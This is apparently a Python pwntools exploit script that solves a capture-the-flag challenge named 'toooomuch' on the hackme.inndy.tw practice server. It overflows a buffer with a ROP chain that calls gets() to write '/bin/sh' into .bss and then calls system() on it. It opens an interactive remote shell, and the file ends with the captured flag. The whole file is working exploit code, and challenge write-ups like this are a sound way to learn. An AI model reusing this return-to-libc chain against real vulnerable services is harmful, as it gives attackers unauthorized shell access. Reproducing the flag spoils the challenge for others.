from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')

elf = ELF('/home/zander/Desktop/ctf/toooomuch')
system_addr = elf.plt['system'] # elf.symbols['system']
print "0x0%x" % system_addr
gets_addr = elf.symbols['gets']
print "0x0%x" % gets_addr
bss_addr = elf.bss()
print "0x0%x" % bss_addr
# 0x080484c0
# 0x08048480
# 0x08049c40

offset = 0xffffcfcc - 0xffffcfb0

# Searching for ASM code: 'pop ?; ret' in: binary ranges
# 0x08048455 : (5bc3)	pop    ebx;	ret
# 0x0804889b : (5dc3)	pop    ebp;	ret
# 0x080488b6 : (5bc3)	pop    ebx;	ret
# 0x08049455 : (5bc3)	pop    ebx;	ret
# 0x0804989b : (5dc3)	pop    ebp;	ret
# 0x080498b6 : (5bc3)	pop    ebx;	ret
pop_ret_addr = 0x080498b6
# system_addr = 0x08048649 # call    _system

payload = 'a' * offset
payload += p32(gets_addr) #return of toooomuch()
payload += p32(pop_ret_addr) # return of gets()
payload += p32(bss_addr) # param of gets() 
payload += p32(system_addr) # ret
payload += 'a' * 4 # pad return address of system()
                   # no padding if use call    _system
payload += p32(bss_addr) # param of system()
payload += p32(0)
print payload
shellcode = "/bin/sh\0"

# p = process('/home/zander/Desktop/ctf/toooomuch')
p = remote('hackme.inndy.tw', 7702)
p.sendline(payload)
p.sendline(shellcode)
p.interactive()
p.close()

# FLAG{Buffer overflow is pretty easy, right?...MbIfR7p9sbKbwPSp}

# b *0x080487a0
# b *0x0804877e start of toooomuch